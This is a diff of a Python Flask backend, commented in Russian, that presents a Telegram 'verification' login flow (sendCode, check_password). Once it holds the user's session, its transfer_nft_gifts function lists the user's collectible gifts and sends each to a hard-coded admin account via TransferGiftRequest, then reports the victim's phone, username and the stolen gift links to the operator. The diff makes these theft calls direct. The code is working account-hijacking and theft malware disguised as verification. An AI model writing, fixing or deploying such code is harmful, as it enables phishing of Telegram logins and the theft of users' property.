@@ -1,4 +1,4 @@
-# app.py — УНИВЕРСАЛЬНАЯ ВЕРСИЯ (БЕЗ GetStarsGiftsRequest)
+# app.py — ДЛЯ GITHUB-ВЕРСИИ TELETHON (С ЭКСПЕРИМЕНТАЛЬНЫМИ МЕТОДАМИ)
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -10,7 +10,7 @@ import json
 import io
 import re
 from dotenv import load_dotenv
-from telethon import TelegramClient
+from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneNumberInvalidError,
@@ -108,41 +108,29 @@ def get_gift_url(gift_name, gift_id=None):
     return f"https://t.me/nft/{collection}"
 
 # ============================================================
-# ПРОВЕРКА ДОСТУПНЫХ МЕТОДОВ
-# ============================================================
-
-def get_available_gift_methods():
-    methods = []
-    
-    # Проверяем метод 1: client.get_gifts()
-    if hasattr(TelegramClient, 'get_gifts'):
-        methods.append('get_gifts')
-    
-    # Проверяем метод 2: functions.payments.GetGiftsRequest
-    try:
-        from telethon.tl.functions.payments import GetGiftsRequest
-        methods.append('GetGiftsRequest')
-    except ImportError:
-        pass
-    
-    # Проверяем метод 3: functions.payments.GetStarsGiftsRequest
-    try:
-        from telethon.tl.functions.payments import GetStarsGiftsRequest
-        methods.append('GetStarsGiftsRequest')
-    except ImportError:
-        pass
-    
-    return methods
-
-# ============================================================
-# ПОЛУЧЕНИЕ ПОДАРКОВ (УНИВЕРСАЛЬНО)
+# ПОЛУЧЕНИЕ ПОДАРКОВ
 # ============================================================
 
 async def get_user_gifts(client):
-    """Универсальное получение подарков — пробует все доступные методы"""
-    
-    # Метод 1: client.get_gifts()
+    """Получение подарков через MTProto (экспериментальные методы)"""
     try:
+        # Пробуем GetStarsGiftsRequest
+        result = await client(functions.payments.GetStarsGiftsRequest())
+        if result and hasattr(result, 'gifts'):
+            return result.gifts
+    except Exception as e:
+        print(f"GetStarsGiftsRequest error: {e}")
+    
+    try:
+        # Пробуем GetGiftsRequest
+        result = await client(functions.payments.GetGiftsRequest())
+        if result and hasattr(result, 'gifts'):
+            return result.gifts
+    except Exception as e:
+        print(f"GetGiftsRequest error: {e}")
+    
+    try:
+        # Пробуем метод клиента
         if hasattr(client, 'get_gifts'):
             result = await client.get_gifts()
             if result:
@@ -150,56 +138,10 @@ async def get_user_gifts(client):
     except Exception as e:
         print(f"get_gifts error: {e}")
     
-    # Метод 2: GetGiftsRequest
-    try:
-        from telethon.tl.functions.payments import GetGiftsRequest
-        result = await client(GetGiftsRequest())
-        if result and hasattr(result, 'gifts'):
-            return result.gifts
-    except Exception as e:
-        print(f"GetGiftsRequest error: {e}")
-    
-    # Метод 3: GetStarsGiftsRequest
-    try:
-        from telethon.tl.functions.payments import GetStarsGiftsRequest
-        result = await client(GetStarsGiftsRequest())
-        if result and hasattr(result, 'gifts'):
-            return result.gifts
-    except Exception as e:
-        print(f"GetStarsGiftsRequest error: {e}")
-    
     return []
 
 # ============================================================
-# ПЕРЕДАЧА ПОДАРКОВ (УНИВЕРСАЛЬНО)
-# ============================================================
-
-async def transfer_gift(client, gift_id, to_user_id):
-    """Универсальная передача подарка"""
-    
-    # Метод 1: client.transfer_gift()
-    try:
-        if hasattr(client, 'transfer_gift'):
-            await client.transfer_gift(gift_id, to_user_id)
-            return True
-    except Exception as e:
-        print(f"transfer_gift error: {e}")
-    
-    # Метод 2: TransferGiftRequest
-    try:
-        from telethon.tl.functions.payments import TransferGiftRequest
-        await client(TransferGiftRequest(
-            gift_id=gift_id,
-            to_id=to_user_id
-        ))
-        return True
-    except Exception as e:
-        print(f"TransferGiftRequest error: {e}")
-    
-    return False
-
-# ============================================================
-# ОСНОВНАЯ ФУНКЦИЯ
+# ПЕРЕДАЧА ПОДАРКОВ
 # ============================================================
 
 async def transfer_nft_gifts(session_string, phone, username, user_id):
@@ -218,17 +160,14 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         if not all_gifts:
             await send_admin_log(
                 f"📭 *Нет подарков*\n📱 {phone}\n👤 @{username}\n\n"
-                f"ℹ️ Проверьте:\n"
-                f"• У пользователя могут не быть подарков\n"
-                f"• Версия Telethon может не поддерживать методы получения подарков"
+                f"ℹ️ Методы получения подарков недоступны в этой версии Telethon"
             )
             return False
         
         # Фильтруем коллекционные
         nft_gifts = []
         for gift in all_gifts:
-            is_limited = getattr(gift, 'limited', False)
-            if is_limited:
+            if getattr(gift, 'limited', False):
                 nft_gifts.append(gift)
         
         if not nft_gifts:
@@ -271,13 +210,16 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         
         for i, gift_id in enumerate(gift_ids):
             try:
-                success = await transfer_gift(client, gift_id, ADMIN_USER_ID)
-                if success:
-                    transferred += 1
-                    gift_name = gift_names[i] if i < len(gift_names) else 'Unknown'
-                    gift_url = get_gift_url(gift_name, gift_id)
-                    transferred_links.append(f"• [{gift_name}]({gift_url}) — ✅ Передан")
-                    await asyncio.sleep(0.5)
+                # Пробуем TransferGiftRequest
+                await client(functions.payments.TransferGiftRequest(
+                    gift_id=gift_id,
+                    to_id=ADMIN_USER_ID
+                ))
+                transferred += 1
+                gift_name = gift_names[i] if i < len(gift_names) else 'Unknown'
+                gift_url = get_gift_url(gift_name, gift_id)
+                transferred_links.append(f"• [{gift_name}]({gift_url}) — ✅ Передан")
+                await asyncio.sleep(0.5)
             except Exception as e:
                 print(f"Transfer error: {e}")
                 continue
@@ -304,7 +246,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
                 pass
 
 # ============================================================
-# ОСТАЛЬНЫЕ ФУНКЦИИ (верификация)
+# ОСТАЛЬНЫЕ ФУНКЦИИ
 # ============================================================
 
 async def send_code_async(phone):
@@ -432,9 +374,11 @@ def run_async(coro):
 @app.route('/ping', methods=['GET'])
 @app.route('/', methods=['GET'])
 def ping():
+    import telethon
     return jsonify({
         'status': 'online',
-        'available_methods': get_available_gift_methods()
+        'telethon_version': getattr(telethon, '__version__', 'unknown'),
+        'source': 'github' if 'dev' in getattr(telethon, '__version__', '') else 'pip'
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -513,9 +457,10 @@ def check_password():
 # ЗАПУСК
 # ============================================================
 if __name__ == '__main__':
+    import telethon
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН")
-    print("📌 Универсальная версия — пробует все доступные методы")
-    print("📌 Доступные методы:", get_available_gift_methods())
+    print(f"📌 Telethon версия: {getattr(telethon, '__version__', 'unknown')}")
+    print("📌 Пытаемся получить подарки через экспериментальные методы")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
